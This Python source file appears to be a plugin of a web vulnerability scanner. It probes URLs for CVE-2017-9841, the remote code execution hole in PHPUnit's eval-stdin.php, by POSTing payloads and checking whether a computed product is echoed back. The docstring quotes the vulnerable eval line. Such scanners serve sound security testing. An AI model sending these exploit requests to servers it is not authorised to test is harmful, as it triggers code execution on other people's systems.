#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests

def cve_2017_9841_scan(self, url):
    ''' phpunit是php中的单元测试工具
    其4.8.19 ~ 4.8.27和5.0.10 ~ 5.6.2版本的vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php文件有如下代码
        eval('?>'.file_get_contents('php://input'));
    如果该文件被用户直接访问到，将造成远程代码执行漏洞
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2017-9841'
    # vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in self.cve_2017_9841_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=self.headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if (str(self.randint_1 * self.randint_2) in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
